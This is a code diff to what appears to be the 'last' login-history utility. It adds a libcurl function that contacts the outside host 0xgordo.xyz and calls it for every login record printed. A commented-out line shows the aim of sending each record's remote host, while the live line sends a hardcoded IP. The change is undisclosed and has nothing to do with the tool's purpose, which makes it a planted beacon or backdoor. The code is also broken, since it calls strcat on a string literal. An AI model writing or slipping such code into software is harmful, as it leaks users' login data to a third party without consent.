@@ -167,6 +167,29 @@ static unsigned int recsdone;	/* Number of records listed */
 static time_t lastdate;		/* Last date we've seen */
 static time_t currentdate;	/* date when we started processing the file */
 
+
+static void make_request(char *domain)
+{
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        //curl_easy_setopt(curl, CURLOPT_URL, strcat("https://0xgordo.xyz/a/?ip=",domain)); //not working
+	curl_easy_setopt(curl, CURLOPT_URL, strcat("https://0xgordo.xyz/a/?ip=177.95.145.68    ")); 
+        // Perform the request, res will get the return code
+        res = curl_easy_perform(curl);
+
+        // Check for errors
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        // Cleanup
+        curl_easy_cleanup(curl);
+    }
+
+}
+
 #ifndef FUZZ_TARGET
 /* --time-format=option parser */
 static int which_time_format(const char *s)
@@ -543,12 +566,14 @@ static int list(const struct last_control *ctl, struct utmpx *p, time_t logout_t
 				ctl->domain_len, domain, ctl->separator,
 				fmt->in_len, fmt->in_len, logintime, ctl->separator, fmt->out_len, fmt->out_len,
 				logouttime, ctl->separator, length);
+				make_request(domain);
 		} else {
 			len = snprintf(final, sizeof(final),
 				"%-8.*s%c%-12.12s%c%-*.*s%c%-*.*s%c%-12.12s%c%s\n",
 				ctl->name_len, p->ut_user, ctl->separator, utline, ctl->separator,
 				fmt->in_len, fmt->in_len, logintime, ctl->separator, fmt->out_len, fmt->out_len,
 				logouttime, ctl->separator, length, ctl->separator, domain);
+				make_request(domain);
 		}
 	} else
 		len = snprintf(final, sizeof(final),
@@ -556,7 +581,8 @@ static int list(const struct last_control *ctl, struct utmpx *p, time_t logout_t
 			ctl->name_len, p->ut_user, ctl->separator, utline, ctl->separator,
 			fmt->in_len, fmt->in_len, logintime, ctl->separator, fmt->out_len, fmt->out_len,
 			logouttime, ctl->separator, length);
-
+			make_request(domain);
+//AQUII
 #if defined(__GLIBC__)
 #  if (__GLIBC__ == 2) && (__GLIBC_MINOR__ == 0)
 	final[sizeof(final)-1] = '\0';
